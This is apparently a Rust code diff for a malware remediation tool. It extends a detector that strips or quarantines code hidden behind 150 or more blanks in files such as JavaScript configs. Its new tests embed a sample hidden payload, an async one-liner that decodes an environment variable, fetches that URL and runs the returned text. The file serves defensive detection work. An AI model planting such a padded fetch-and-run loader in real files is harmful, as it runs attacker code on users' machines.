@@ -286,15 +286,23 @@ static PREFIXED_0X: LazyLock<Regex> =
 /// Whitespace the loader is pushed past, so it sits off-screen in an editor.
 const LOADER_PAD: usize = 64;
 
+/// Code pushed off-screen by 150+ blanks, whatever it is named (the
+/// `hidden.padded.code` signature): the blanks start after a visible
+/// character or at the start of a line.
+static HIDDEN_CODE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?m)(?:^|[^\x00-\x20\x7f])([ \t]{150,}(?:[A-Za-z_$(\[!;+~{'"`\\-]|/[^/]).*)"#)
+        .unwrap()
+});
+
 #[derive(Debug, PartialEq)]
 pub enum LoaderFix {
-    /// No loader marker.
+    /// No loader marker and no padded hidden code.
     None,
     /// The marker is the first thing in the file: the whole file is the loader.
     Whole,
-    /// The real file with the padded loader cut off its last line.
+    /// The real file with the padded loader cut out.
     Cut(String),
-    /// A marker in a place this can't cut safely.
+    /// A marker or hidden code in a place this can't cut safely.
     Unsafe,
 }
 
@@ -308,7 +316,7 @@ pub fn strip_padded_loader(text: &str) -> LoaderFix {
         return if PREFIXED_0X.is_match(start) {
             LoaderFix::Whole
         } else {
-            LoaderFix::None
+            cut_hidden_code(text)
         };
     };
     let head = &text[..m.start()];
@@ -338,6 +346,51 @@ pub fn strip_padded_loader(text: &str) -> LoaderFix {
         return LoaderFix::Unsafe;
     }
     LoaderFix::Cut(new)
+}
+
+/// Cut every padded tail (blanks to end of line) out of `text`. A line that
+/// held nothing but the padded code goes too. Each cut piece and the result
+/// must have balanced brackets, else the bounds are unclear.
+fn cut_hidden_code(text: &str) -> LoaderFix {
+    let mut out = String::with_capacity(text.len());
+    let mut last = 0;
+    let mut found = false;
+    for c in HIDDEN_CODE.captures_iter(text) {
+        let tail = c.get(1).unwrap();
+        // `.*` stops before "\n", so keep a CRLF's "\r"
+        let end = if tail.as_str().ends_with('\r') {
+            tail.end() - 1
+        } else {
+            tail.end()
+        };
+        if !brackets_balanced(&text.as_bytes()[tail.start()..end]) {
+            return LoaderFix::Unsafe;
+        }
+        found = true;
+        let line_start = text[..tail.start()].rfind('\n').map_or(0, |i| i + 1);
+        if line_start == tail.start() {
+            // the whole line was the hidden code: drop it with its newline
+            out.push_str(&text[last..line_start]);
+            let rest = &text[end..];
+            last = end
+                + if rest.starts_with("\r\n") {
+                    2
+                } else {
+                    usize::from(rest.starts_with('\n'))
+                };
+        } else {
+            out.push_str(&text[last..tail.start()]);
+            last = end;
+        }
+    }
+    if !found {
+        return LoaderFix::None;
+    }
+    out.push_str(&text[last..]);
+    if HIDDEN_CODE.is_match(&out) || !brackets_balanced(out.as_bytes()) {
+        return LoaderFix::Unsafe;
+    }
+    LoaderFix::Cut(out)
 }
 
 // ---------------------------------------------------------------------------
@@ -548,11 +601,9 @@ impl Remediator {
         };
         match strip_padded_loader(&text) {
             LoaderFix::None => Ok(None),
-            LoaderFix::Whole => self
-                .quarantine_file(path, "whole-file _0x loader")
-                .map(Some),
+            LoaderFix::Whole => self.quarantine_file(path, "whole-file loader").map(Some),
             LoaderFix::Unsafe => self
-                .quarantine_file(path, "_0x loader with unclear bounds")
+                .quarantine_file(path, "hidden loader with unclear bounds")
                 .map(Some),
             LoaderFix::Cut(new) => {
                 let (backup, before) = self.backup(path)?;
@@ -564,10 +615,10 @@ impl Remediator {
                     Some(&backup),
                     json!(before),
                     json!(after),
-                    "removed padded _0x loader",
+                    "removed padded hidden loader",
                 );
                 self.log(&format!(
-                    "remediate: cut padded _0x loader from {path} (kept the real code)"
+                    "remediate: cut padded hidden loader from {path} (kept the real code)"
                 ));
                 Ok(Some(
                     json!({"action": "neutralize", "path": path, "blocks": 1, "backup": backup.to_string_lossy()}),
@@ -1066,6 +1117,61 @@ mod tests {
             concat!("glo", "balThis.version=\"10-1300\";").to_string(),
         ] {
             assert_eq!(strip_padded_loader(&src), LoaderFix::None, "{src}");
+        }
+    }
+
+    /// Code pushed off-screen with normal names and no marker: the padding
+    /// alone is the tell.
+    #[test]
+    fn padded_hidden_code_cases() {
+        let pad = " ".repeat(160);
+        let tabs = "\t".repeat(150);
+        let real = "module.exports = { plugins: [] };";
+        let hidden = "(async()=>{const u=atob(process.env.SESSION);const r=await fetch(u);run(await r.text())})();";
+        for (p, nl) in [(&pad, "\n"), (&tabs, "\r\n"), (&pad, "")] {
+            // cut off the end of the last line
+            let src = format!("{real}{p}{hidden}{nl}");
+            assert_eq!(
+                strip_padded_loader(&src),
+                LoaderFix::Cut(format!("{real}{nl}"))
+            );
+        }
+        for (p, nl) in [(&pad, "\n"), (&tabs, "\r\n")] {
+            // cut off the end of a line mid-file
+            let src = format!("// cfg\n{real}{p}{hidden}{nl}more();{nl}");
+            assert_eq!(
+                strip_padded_loader(&src),
+                LoaderFix::Cut(format!("// cfg\n{real}{nl}more();{nl}")),
+                "{nl:?}"
+            );
+            // a line that is nothing but padded code goes with its newline
+            let src = format!("a();{nl}{p}{hidden}{nl}b();{nl}");
+            assert_eq!(
+                strip_padded_loader(&src),
+                LoaderFix::Cut(format!("a();{nl}b();{nl}"))
+            );
+        }
+        // two hidden tails in one file
+        let src = format!("a();{pad}{hidden}\nb();{pad}{hidden}\n");
+        assert_eq!(
+            strip_padded_loader(&src),
+            LoaderFix::Cut("a();\nb();\n".into())
+        );
+        for src in [
+            format!("{real}{pad}(function(){{\nrun();\n}})();\n"), // runs past its line
+            format!("f({pad}g());\n"),                             // cut leaves f( open
+        ] {
+            assert_eq!(strip_padded_loader(&src), LoaderFix::Unsafe, "{src}");
+        }
+        let short = " ".repeat(149);
+        for src in [
+            format!("{real}{short}{hidden}\n"),         // under 150 blanks
+            format!("{real}{pad}// aligned comment\n"), // a comment, not code
+            format!("{real}{pad}# shell comment\n"),
+            format!("{real}{pad}\n"),             // trailing blanks
+            format!("x = '\u{2}{tabs}\u{2}';\n"), // blanks inside a binary table
+        ] {
+            assert_eq!(strip_padded_loader(&src), LoaderFix::None, "{src:?}");
         }
     }
 
